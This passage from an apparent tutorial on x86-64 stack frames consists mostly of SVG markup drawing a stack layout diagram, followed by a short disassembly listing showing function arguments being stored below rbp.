<text text-anchor='middle' x='592' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='292' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='648' y='292' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='656' y='292' fill='currentColor' style='font-size:1em'>p</text>
</g>

    </svg>
  
</div>
<p>It is a good idea to visualize how the stack will look after this function has been loaded and all the required memory is allocated to it.</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 848 665"
      >
      <g transform='translate(8,16)'>
<path d='M 520,160 L 520,176' fill='none' stroke='currentColor'></path>
<path d='M 520,176 L 520,192' fill='none' stroke='currentColor'></path>
<path d='M 528,464 L 528,480' fill='none' stroke='currentColor'></path>
<path d='M 528,480 L 528,496' fill='none' stroke='currentColor'></path>
<path d='M 528,496 L 528,512' fill='none' stroke='currentColor'></path>
<path d='M 528,512 L 528,528' fill='none' stroke='currentColor'></path>
<path d='M 528,528 L 528,544' fill='none' stroke='currentColor'></path>
<path d='M 528,544 L 528,560' fill='none' stroke='currentColor'></path>
<circle cx='248' cy='48' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='248' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='264' cy='48' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='264' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='280' cy='48' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='280' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='296' cy='48' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='296' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<text text-anchor='middle' x='0' y='644' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='8' y='644' fill='currentColor' style='font-size:1em'>O</text>
<text text-anchor='middle' x='16' y='644' fill='currentColor' style='font-size:1em'>W</text>
<text text-anchor='middle' x='32' y='20' fill='currentColor' style='font-size:1em'>H</text>
<text text-anchor='middle' x='32' y='644' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='40' y='20' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='40' y='644' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='48' y='20' fill='currentColor' style='font-size:1em'>G</text>
<text text-anchor='middle' x='48' y='644' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='56' y='20' fill='currentColor' style='font-size:1em'>H</text>
<text text-anchor='middle' x='56' y='644' fill='currentColor' style='font-size:1em'>R</text>
<text text-anchor='middle' x='72' y='20' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='80' y='20' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='88' y='20' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='96' y='20' fill='currentColor' style='font-size:1em'>R</text>
<text text-anchor='middle' x='128' y='324' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='128' y='356' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='128' y='388' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='128' y='452' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='128' y='564' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='136' y='324' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='136' y='356' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='136' y='388' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='136' y='452' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='136' y='564' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='144' y='324' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='144' y='356' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='144' y='388' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='144' y='452' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='144' y='564' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='160' y='324' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='160' y='356' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='160' y='388' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='160' y='452' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='160' y='564' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='176' y='324' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='176' y='356' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='176' y='388' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='176' y='452' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='176' y='564' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='184' y='324' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='184' y='356' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='184' y='388' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='184' y='452' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='184' y='564' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='192' y='324' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='192' y='356' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='192' y='388' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='192' y='452' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='192' y='564' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='200' y='324' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='200' y='356' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='200' y='388' fill='currentColor' style='font-size:1em'>9</text>
<text text-anchor='middle' x='200' y='452' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='200' y='564' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='224' y='20' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='224' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='452' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='516' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='532' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='548' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='564' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='580' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='596' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='612' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='232' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='248' y='148' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='248' y='228' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='248' y='260' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='248' y='292' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='256' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='116' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='256' y='148' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='256' y='228' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='256' y='260' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='256' y='292' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='264' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='116' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='264' y='148' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='264' y='228' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='264' y='260' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='264' y='292' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='272' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='116' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='272' y='148' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='272' y='292' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='280' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='280' y='148' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='280' y='292' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='288' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='116' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='288' y='148' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='288' y='292' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='296' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='116' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='304' y='148' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='304' y='292' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='312' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='116' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='312' y='148' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='312' y='292' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='320' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='116' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='320' y='148' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='320' y='292' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='328' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='328' y='148' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='328' y='292' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='336' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='116' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='336' y='148' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='336' y='292' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='344' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='116' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='344' y='148' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='344' y='292' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='352' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='116' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='352' y='148' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='352' y='292' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='360' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='116' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='368' y='148' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='368' y='292' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='376' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='116' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='376' y='148' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='376' y='292' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='384' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='116' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='392' y='148' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='392' y='292' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='400' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='400' y='148' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='400' y='292' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='408' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='116' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='408' y='148' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='408' y='292' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='416' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='116' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='416' y='148' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='416' y='292' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='424' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='292' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='432' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='116' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='432' y='148' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='440' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='116' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='440' y='148' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='440' y='292' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='448' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='116' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='448' y='148' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='448' y='292' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='456' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='116' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='456' y='148' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='456' y='292' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='464' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='292' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='472' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='20' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='488' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='452' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='516' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='532' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='548' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='564' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='580' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='596' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='488' y='612' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='496' y='148' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='496' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='496' y='452' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='496' y='580' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='504' y='148' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='504' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='504' y='292' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='504' y='452' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='504' y='580' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='512' y='148' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='512' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='512' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='452' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='512' y='580' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='520' y='148' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='520' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='520' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='452' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='520' y='580' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='528' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='452' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='528' y='580' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='536' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='180' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='544' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='180' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='552' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='516' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='560' y='180' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='560' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='516' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='568' y='180' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='568' y='516' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='576' y='516' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='584' y='292' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='584' y='516' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='592' y='292' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='600' y='292' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='600' y='516' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='608' y='516' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='616' y='516' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='624' y='516' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='632' y='516' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='640' y='516' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='648' y='516' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='656' y='516' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='664' y='516' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='680' y='516' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='688' y='516' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='696' y='516' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='712' y='516' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='720' y='516' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='728' y='516' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='736' y='516' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='744' y='516' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='752' y='516' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='768' y='516' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='776' y='516' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='784' y='516' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='792' y='516' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='800' y='516' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='808' y='516' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='816' y='516' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='824' y='516' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='832' y='516' fill='currentColor' style='font-size:1em'>s</text>
</g>

    </svg>
  
</div>
<p>Now we can understand easily which variables are stored where on the stack. The previously passed positional arguments are loaded to stack after the local variables.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">111</span><span class="nl">d:</span>       <span class="err">89</span> <span class="err">7</span><span class="nf">d</span> <span class="no">ec</span>                <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x14</span><span class="p">],</span><span class="no">edi</span>         <span class="c1">; 0x1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">1120:</span>       <span class="err">89</span> <span class="err">75</span> <span class="nf">e8</span>                <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x18</span><span class="p">],</span><span class="no">esi</span>         <span class="c1">; 0x2
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">1123:</span>       <span class="err">89</span> <span class="err">55</span> <span class="nf">e4</span>                <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x1c</span><span class="p">],</span><span class="no">edx</span>         <span class="c1">; 0x3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">1126:</span>       <span class="err">89</span> <span class="err">4</span><span class="nf">d</span> <span class="no">e0</span>                <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x20</span><span class="p">],</span><span class="no">ecx</span>         <span class="c1">; 0x4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">1129:</span>       <span class="err">44</span> <span class="err">89</span> <span class="err">45</span> <span class="nf">dc</span>             <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x24</span><span class="p">],</span><span class="no">r8d</span>         <span class="c1">; 0x5
